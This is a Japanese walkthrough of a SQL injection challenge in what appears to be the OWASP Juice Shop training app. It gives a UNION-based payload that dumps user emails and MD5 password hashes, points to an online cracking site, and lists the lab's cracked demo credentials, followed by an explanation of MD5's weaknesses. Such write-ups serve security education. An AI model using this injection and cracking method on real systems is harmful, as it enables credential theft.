# User Credentials ✅

**難易度:** ⭐⭐⭐⭐
**カテゴリ:** SQLi
**目標:** 全ユーザーのメールアドレスとパスワードハッシュを取得

---

## 実行手順

検索バーに以下を入力:
```
')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--
```

## パスワードの解読

取得したハッシュを https://crackstation.net/ にペースト。
MD5ハッシュなので、よくあるパスワードなら数秒で解読できる。

## 主要ユーザーの認証情報

| ユーザー | MD5ハッシュ | パスワード | 元ネタ |
|---------|------------|-----------|--------|
| admin@juice-sh.op | 0192023a7bbd73250516f069df18b500 | admin123 | よくあるパスワード |
| jim@juice-sh.op | e541ca7ecf72b8d1286474fc613e5e45 | ncc-1701 | スタートレック |
| bender@juice-sh.op | 0c36e517e3fa95aabf1bbffc6744a4ef | OhG0dPlease1LubYou | Futurama |

## 解説

**MD5の問題点:**
- 高速すぎる（ブルートフォースが容易）
- レインボーテーブル攻撃に脆弱
- 衝突攻撃が可能

**推奨されるハッシュアルゴリズム:**
- bcrypt
- Argon2
- scrypt

## 関連チャレンジ

- [Database Schema](database-schema.md)
- [Login Jim](../difficulty-3/login-jim.md)
